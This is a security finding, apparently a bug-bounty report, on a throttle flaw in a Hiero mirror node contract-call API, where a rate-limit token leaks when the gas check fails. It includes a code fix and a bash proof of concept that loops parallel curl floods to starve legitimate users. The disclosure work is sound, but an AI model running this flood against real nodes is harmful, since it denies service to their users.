### Title
`rateLimitBucket` Token Leak Enables Sustained DoS via Sequential Throttle Check Without Rollback

### Summary
In `ThrottleManagerImpl.throttle()`, a `rateLimitBucket` token is unconditionally consumed before the `gasLimitBucket` check is performed. When `gasLimitBucket.tryConsume()` fails, the already-consumed `rateLimitBucket` token is never restored. An unprivileged attacker can exploit this to continuously drain the global `rateLimitBucket`, starving all legitimate users of request slots.

### Finding Description
**Exact code path:** `web3/src/main/java/org/hiero/mirror/web3/throttle/ThrottleManagerImpl.java`, `throttle()`, lines 38–42:

```java
if (!rateLimitBucket.tryConsume(1)) {                                          // line 38 — token consumed
    throw new ThrottleException(REQUEST_PER_SECOND_LIMIT_EXCEEDED);
} else if (!gasLimitBucket.tryConsume(throttleProperties.scaleGas(request.getGas()))) {  // line 40 — may fail
    throw new ThrottleException(GAS_PER_SECOND_LIMIT_EXCEEDED);               // line 41 — token NOT restored
}
```

**Root cause:** The `rateLimitBucket` token consumed at line 38 is never rolled back when the `gasLimitBucket` check at line 40 fails. The `restore()` method (lines 59–64) only adds tokens back to `gasLimitBucket`, not `rateLimitBucket`. The `ContractController` only calls `restore()` on `InvalidParametersException`, not on `ThrottleException`.

**Exploit flow:**

*Phase 1 — Exhaust `gasLimitBucket`:*
- Default capacity: `7,500,000,000 / 10,000 = 750,000` scaled tokens.
- Default rate limit: 500 req/s; default max gas: 15,000,000 → 1,500 scaled tokens/request.
- 500 × 1,500 = 750,000 tokens/s → gas bucket exhausted in ≤1 second.

*Phase 2 — Drain `rateLimitBucket`:*
- With `gasLimitBucket` at 0, any request with `gas ≥ 21,000` (the enforced minimum per `@Min(21_000)`) requires `scaleGas(21000) = 2` tokens from `gasLimitBucket`, which fails.
- Each such request still consumes 1 token from `rateLimitBucket` (line 38) with no restoration.
- Attacker floods at 500 req/s, draining all `rateLimitBucket` tokens each second.
- `rateLimitBucket` refills at 500/s, but the attacker continuously re-drains it, leaving 0 tokens for legitimate users.

**Why existing checks are insufficient:**
- `restore()` is gas-only; there is no `rateLimitBucket.addTokens()` call anywhere in the codebase.
- There is no per-IP or per-user rate limiting; both buckets are global singletons shared across all callers.
- The `ContractController` catch block for `InvalidParametersException` (line 46–49) does not cover `ThrottleException`, so no restoration path is triggered.

### Impact Explanation
All legitimate users of the `/api/v1/contracts/call` endpoint receive `429 REQUEST_PER_SECOND_LIMIT_EXCEEDED` errors for as long as the attacker sustains the flood. The attacker's own requests also fail (gas-throttled), but the attacker has no interest in successful responses — the goal is denial of service. Because the buckets are global and there is no per-client isolation, a single attacker with a standard HTTP client can monopolize the entire `rateLimitBucket` capacity.

### Likelihood Explanation
No authentication, API key, or privileged access is required. Any HTTP client capable of sending ~500 POST requests per second to `/api/v1/contracts/call` with a valid JSON body can trigger this. The attack is fully repeatable and can be sustained indefinitely with a modest amount of network bandwidth. The two-phase setup (exhaust gas, then drain rate tokens) is straightforward and requires no special knowledge of the system beyond reading the public API.

### Recommendation
Restore the `rateLimitBucket` token when `gasLimitBucket.tryConsume()` fails:

```java
if (!rateLimitBucket.tryConsume(1)) {
    throw new ThrottleException(REQUEST_PER_SECOND_LIMIT_EXCEEDED);
} else if (!gasLimitBucket.tryConsume(throttleProperties.scaleGas(request.getGas()))) {
    rateLimitBucket.addTokens(1);   // <-- restore the consumed token
    throw new ThrottleException(GAS_PER_SECOND_LIMIT_EXCEEDED);
}
```

Alternatively, check both buckets speculatively (without consuming) before committing either consumption, or use a single atomic multi-bucket check if the bucket4j API supports it.

### Proof of Concept
```bash
# Phase 1: exhaust gasLimitBucket (~1 second at 500 req/s with max gas)
for i in $(seq 1 500); do
  curl -s -X POST http://<mirror-node>/api/v1/contracts/call \
    -H 'Content-Type: application/json' \
    -d '{"to":"0x0000000000000000000000000000000000000001","gas":15000000}' &
done
wait

# Phase 2: continuously drain rateLimitBucket (gas bucket stays empty)
while true; do
  for i in $(seq 1 500); do
    curl -s -X POST http://<mirror-node>/api/v1/contracts/call \
      -H 'Content-Type: application/json' \
      -d '{"to":"0x0000000000000000000000000000000000000001","gas":21000}' &
  done
  wait
done
# Legitimate users now receive: "Requests per second rate limit exceeded"
```
